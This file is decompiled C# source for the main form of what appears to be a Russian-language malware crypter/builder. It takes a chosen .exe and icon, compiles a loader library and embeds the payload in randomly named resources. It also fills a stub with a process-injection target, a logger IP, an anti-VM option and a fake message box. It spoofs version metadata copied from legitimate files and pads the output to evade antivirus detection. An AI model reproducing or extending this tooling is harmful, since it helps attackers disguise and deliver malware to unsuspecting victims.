using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Resources;
using System.Windows.Forms;

// Token: 0x02000033 RID: 51
public partial class Form1 : Form
{
	// Token: 0x060001CF RID: 463 RVA: 0x00263908 File Offset: 0x00261B08
	public Form1()
	{
		this.InitializeComponent();
		this.flatComboBox1.Text = "vbc";
		this.TitleName.Text = Form1.smethod_0();
		this.DescriptionText.Text = Form1.smethod_0();
		this.CompanyText.Text = Form1.smethod_0();
		this.CopyrightText.Text = Form1.smethod_0();
		this.VersionText.Text = string.Format("{0}.{1}.{2}.{3}", new object[]
		{
			Form1.random_0.Next(0, 9),
			Form1.random_0.Next(0, 9),
			Form1.random_0.Next(0, 9),
			Form1.random_0.Next(0, 9)
		});
		this.Guid_Value.Text = Guid.NewGuid().ToString();
		this.flatComboBox2.Text = "None";
		this.pictureBox2.Visible = false;
		this.pictureBox1.Visible = false;
		this.pictureBox4.Visible = false;
		this.pictureBox3.Visible = false;
		this.richTextBox1.ReadOnly = true;
		this.flatTextBox4.Enabled = false;
	}

	// Token: 0x060001D0 RID: 464 RVA: 0x00263A58 File Offset: 0x00261C58
	private void flatButton1_Click(object sender, EventArgs e)
	{
		using (OpenFileDialog openFileDialog = new OpenFileDialog())
		{
			openFileDialog.Title = "Выберите файл";
			openFileDialog.Filter = ".exe|*.exe";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.flatTextBox1.Text = openFileDialog.FileName;
			}
		}
	}

	// Token: 0x060001D1 RID: 465 RVA: 0x00263AB8 File Offset: 0x00261CB8
	private void flatButton3_Click(object sender, EventArgs e)
	{
		using (OpenFileDialog openFileDialog = new OpenFileDialog())
		{
			openFileDialog.Title = "Выберите иконку";
			openFileDialog.Filter = ".ico|*.ico";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.flatTextBox2.Text = openFileDialog.FileName;
			}
		}
	}

	// Token: 0x060001D2 RID: 466 RVA: 0x00263B1C File Offset: 0x00261D1C
	private static string smethod_0()
	{
		return Path.GetRandomFileName().Replace(".", "");
	}

	// Token: 0x060001D3 RID: 467 RVA: 0x00263B40 File Offset: 0x00261D40
	private void flatButton5_Click(object sender, EventArgs e)
	{
		this.TitleName.Text = Form1.smethod_0();
		this.DescriptionText.Text = Form1.smethod_0();
		this.CompanyText.Text = Form1.smethod_0();
		this.CopyrightText.Text = Form1.smethod_0();
		this.VersionText.Text = string.Format("{0}.{1}.{2}.{3}", new object[]
		{
			Form1.random_0.Next(0, 9),
			Form1.random_0.Next(0, 9),
			Form1.random_0.Next(0, 9),
			Form1.random_0.Next(0, 9)
		});
		this.Guid_Value.Text = Guid.NewGuid().ToString();
	}

	// Token: 0x060001D4 RID: 468 RVA: 0x00263C1C File Offset: 0x00261E1C
	public void method_0(string string_0, int int_0, bool bool_1)
	{
		int_0 *= 1024;
		FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write);
		byte[] buffer = new byte[int_0];
		if (bool_1)
		{
			new Random().NextBytes(buffer);
		}
		fileStream.Write(buffer, 0, int_0);
		fileStream.Close();
	}

	// Token: 0x060001D5 RID: 469 RVA: 0x00263C60 File Offset: 0x00261E60
	private void flatButton4_Click(object sender, EventArgs e)
	{
		if (this.flatTextBox1.Text != "")
		{
			using (SaveFileDialog saveFileDialog = new SaveFileDialog())
			{
				saveFileDialog.Title = "Созранить файл";
				saveFileDialog.Filter = ".exe|*.exe";
				saveFileDialog.FileName = Class4.smethod_3(5);
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					string string_ = Class6.String_1;
					if (!Class3.smethod_0(AppDomain.CurrentDomain.BaseDirectory + "Loader.dll", "cs", new string[]
					{
						string_
					}, null, null, new string[]
					{
						"System.Windows.Forms.dll",
						"System.Drawing.dll"
					}, null, "library", 20))
					{
						throw new Exception("Не удалось скомпилировать библиотеку.");
					}
					string text = Class6.String_3;
					string text2 = Class4.smethod_2(10);
					Bitmap value = Class4.smethod_0(AppDomain.CurrentDomain.BaseDirectory + "Loader.dll");
					string text3 = Class4.smethod_2(Form1.random_0.Next(10, 150));
					Bitmap value2 = Class4.smethod_0(this.flatTextBox3.Text);
					string text4 = Class4.smethod_2(Form1.random_0.Next(10, 150));
					string text5 = Class4.smethod_2(Form1.random_0.Next(10, 150));
					Bitmap value3 = Class4.smethod_0(this.flatTextBox1.Text);
					using (ResourceWriter resourceWriter = new ResourceWriter(text2 + ".resources"))
					{
						resourceWriter.AddResource(text5, value3);
						if (this.flatTextBox3.Text != "")
						{
							resourceWriter.AddResource(text4, value2);
						}
						resourceWriter.AddResource(text3, value);
						resourceWriter.AddResource(Class4.smethod_2(Form1.random_0.Next(10, 150)), new byte[Form1.random_0.Next(1024, 5000)]);
						resourceWriter.AddResource(Class4.smethod_2(Form1.random_0.Next(10, 150)), new byte[Form1.random_0.Next(1024, 5000)]);
						resourceWriter.Generate();
					}
					text = text.Replace("[resName]", text2).Replace("[inject]", this.flatComboBox1.Text).Replace("[fileName]", text5).Replace("[fileName2]", text4).Replace("[IP]", this.Logger.Text).Replace("[loaderName]", text3).Replace("[Title]", this.TitleName.Text).Replace("[Description]", this.DescriptionText.Text).Replace("[Company]", this.CompanyText.Text).Replace("[Product]", this.TitleName.Text).Replace("[Copyright]", this.CopyrightText.Text).Replace("[Guid]", this.Guid_Value.Text).Replace("[Fake]", this.flatComboBox2.Text).Replace("[Zagol]", this.flatTextBox4.Text).Replace("[TextFake]", this.richTextBox1.Text).Replace("[Version]", this.VersionText.Text);
					string text6 = "";
					if (this.flatComboBox2.Text != "None")
					{
						text6 += "FAKE;";
					}
					if (this.flatTextBox3.Text != "")
					{
						text6 += "FILE;";
					}
					if (this.Logger.Text != "")
					{
						text6 += "LOGGER;";
					}
					if (this.AntiVM.Boolean_0)
					{
						text6 += "VM;";
					}
					if (this.flatTextBox2.Text != "")
					{
						this.bool_0 = Class3.smethod_1(text, saveFileDialog.FileName, "v4.0", Application.StartupPath + "\\" + text2 + ".resources", text6, this.flatTextBox2.Text);
						File.Delete("Loader.dll");
						File.Delete(text2 + ".resources");
					}
					else
					{
						this.bool_0 = Class3.smethod_1(text, saveFileDialog.FileName, "v4.0", Application.StartupPath + "\\" + text2 + ".resources", text6, null);
						File.Delete("Loader.dll");
						File.Delete(text2 + ".resources");
					}
				}
				if (this.bool_0)
				{
					if (this.flatCheckBox1.Boolean_0)
					{
						Class2.smethod_0(saveFileDialog.FileName);
					}
					if ((int)this.flatNumeric1.Int64_0 > 0)
					{
						this.method_0(saveFileDialog.FileName, (int)this.flatNumeric1.Int64_0, false);
					}
					MessageBox.Show("Успешно! Файл сохранен по этому пути:\r\n" + saveFileDialog.FileName, " Успешно!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				return;
			}
		}
		MessageBox.Show("Выбирете файл!", " Ошибка!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
	}

	// Token: 0x060001D6 RID: 470 RVA: 0x002641A8 File Offset: 0x002623A8
	private void flatButton6_Click(object sender, EventArgs e)
	{
		using (OpenFileDialog openFileDialog = new OpenFileDialog())
		{
			openFileDialog.Title = "Выберите файл";
			openFileDialog.Filter = ".exe|*.exe";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.flatTextBox3.Text = openFileDialog.FileName;
			}
		}
	}

	// Token: 0x060001D7 RID: 471 RVA: 0x00264208 File Offset: 0x00262408
	private void pictureBox3_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x060001D8 RID: 472 RVA: 0x00264218 File Offset: 0x00262418
	private void flatComboBox2_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (this.flatComboBox2.Text == "Information")
		{
			this.pictureBox1.Visible = true;
			this.pictureBox2.Visible = false;
			this.pictureBox4.Visible = false;
			this.pictureBox3.Visible = false;
			this.flatTextBox4.Enabled = true;
			this.richTextBox1.ReadOnly = false;
		}
		if (this.flatComboBox2.Text == "Warning")
		{
			this.pictureBox3.Visible = true;
			this.pictureBox1.Visible = false;
			this.pictureBox4.Visible = false;
			this.pictureBox2.Visible = false;
			this.flatTextBox4.Enabled = true;
			this.richTextBox1.ReadOnly = false;
		}
		if (this.flatComboBox2.Text == "Question")
		{
			this.pictureBox2.Visible = true;
			this.pictureBox1.Visible = false;
			this.pictureBox4.Visible = false;
			this.pictureBox3.Visible = false;
			this.flatTextBox4.Enabled = true;
			this.richTextBox1.ReadOnly = false;
		}
		if (this.flatComboBox2.Text == "Error")
		{
			this.pictureBox4.Visible = true;
			this.pictureBox1.Visible = false;
			this.pictureBox2.Visible = false;
			this.pictureBox3.Visible = false;
			this.flatTextBox4.Enabled = true;
			this.richTextBox1.ReadOnly = false;
		}
		if (this.flatComboBox2.Text == "None")
		{
			this.pictureBox4.Visible = false;
			this.pictureBox1.Visible = false;
			this.pictureBox2.Visible = false;
			this.pictureBox3.Visible = false;
			this.flatTextBox4.Enabled = false;
			this.richTextBox1.ReadOnly = true;
		}
	}

	// Token: 0x060001D9 RID: 473 RVA: 0x00264400 File Offset: 0x00262600
	private void flatButton8_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog
		{
			Filter = "Любой файл|*.*"
		};
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
			this.CompanyText.Text = versionInfo.CompanyName;
			this.TitleName.Text = versionInfo.FileDescription;
			this.DescriptionText.Text = versionInfo.FileDescription;
			this.CopyrightText.Text = versionInfo.LegalCopyright;
			this.Guid_Value.Text = Guid.NewGuid().ToString();
			this.VersionText.Text = string.Concat(new string[]
			{
				versionInfo.FileMajorPart.ToString(),
				".",
				versionInfo.FileMinorPart.ToString(),
				".",
				versionInfo.FileBuildPart.ToString(),
				".0"
			});
		}
	}

	// Token: 0x060001DA RID: 474 RVA: 0x00264208 File Offset: 0x00262408
	private void method_1(object sender, EventArgs e)
	{
	}

	// Token: 0x060001DB RID: 475 RVA: 0x00264208 File Offset: 0x00262408
	private void method_2(object sender, EventArgs e)
	{
	}

	// Token: 0x060001DC RID: 476 RVA: 0x00264208 File Offset: 0x00262408
	private void method_3(object object_0)
	{
	}

	// Token: 0x060001DD RID: 477 RVA: 0x002644FC File Offset: 0x002626FC
	protected virtual void Dispose(bool disposing)
	{
		if (disposing && this.icontainer_0 != null)
		{
			this.icontainer_0.Dispose();
		}
		base.Dispose(disposing);
	}

	// Token: 0x040000FA RID: 250
	private static Random random_0 = new Random();

	// Token: 0x040000FB RID: 251
	private bool bool_0;
}
